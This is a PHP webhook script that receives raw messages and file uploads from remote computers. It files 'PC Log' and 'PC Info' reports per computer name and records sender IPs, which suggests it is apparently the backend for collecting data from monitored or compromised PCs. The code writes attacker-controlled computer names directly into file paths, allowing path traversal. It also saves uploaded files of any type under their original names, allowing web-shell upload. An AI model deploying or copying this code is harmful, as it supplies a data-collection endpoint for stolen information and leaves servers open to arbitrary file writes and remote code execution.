<?php
// Get request data
$data = file_get_contents('php://input');

// Check if it's a file upload
$isFileUpload = isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK;

if ($isFileUpload) {
    handleFileUpload($_FILES['file'], $data);
} else {
    // Determine message type
    if (strpos($data, '[Type: PC Log]') !== false) {
        handlePCLog($data);
    } elseif (strpos($data, '[Type: PC Info]') !== false) {
        handlePCInfo($data);
    } else {
        handleNormalMessage($data);
    }
}

// HTTP response code
http_response_code(200);

// Functions to handle different message types
// Function to handle normal messages
function handleNormalMessage($data) {
    // Extract IP address and timestamp
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    $timestamp = date('c');

    // Append a row of dashes to the end of the message
    $data .= "\n------------------------\n";

    // Format normal message
    $formattedMessage = "IP Address: $ipAddress\nTimestamp: $timestamp\n$data";

    // Save formatted message to the main log
    file_put_contents('webhook.log', $formattedMessage, FILE_APPEND | LOCK_EX);
}


// Function to handle PC log messages
function handlePCLog($data) {
    // Extract computer name from the header
    preg_match("/\[Computer: (.+?)\]/", $data, $matches);
    $computerName = isset($matches[1]) ? $matches[1] : '';

    if ($computerName !== '') {
        // Append a row of dashes to the end of the message
        $data .= "\n------------------------\n";

        // Save PC log to individual file using the computer name
        $pcLogFile = "pc_logs/{$computerName}_log.txt";
        file_put_contents($pcLogFile, $data, FILE_APPEND | LOCK_EX);
    }
}

// Function to handle PC info messages
function handlePCInfo($data) {
    // Extract computer name from the header
    preg_match("/\[Computer: (.+?)\]/", $data, $matches);
    $computerName = isset($matches[1]) ? $matches[1] : '';

    if ($computerName !== '') {
        // Append a row of dashes to the end of the message
        $data .= "\n------------------------\n";

        // Save PC Info to individual file using the computer name
        $pcInfoFile = "pc_info/{$computerName}_info.txt";
        file_put_contents($pcInfoFile, $data, FILE_APPEND | LOCK_EX);
    }
}


function handleFileUpload($file, $data) {
    // Extract relevant information from the file
    $fileName = basename($file['name']);
    $fileContent = file_get_contents($file['tmp_name']);

    // Save file information to a separate log
    $fileLog = "file_uploads/file_log.txt";
    $formattedFileLog = "File Name: $fileName\n" . "File Content:\n$fileContent\n------------------------\n";

    file_put_contents($fileLog, $formattedFileLog, FILE_APPEND | LOCK_EX);

    // You can also save the file itself if needed
    $uploadedFilePath = "file_uploads/$fileName";
    move_uploaded_file($file['tmp_name'], $uploadedFilePath);
}
?>
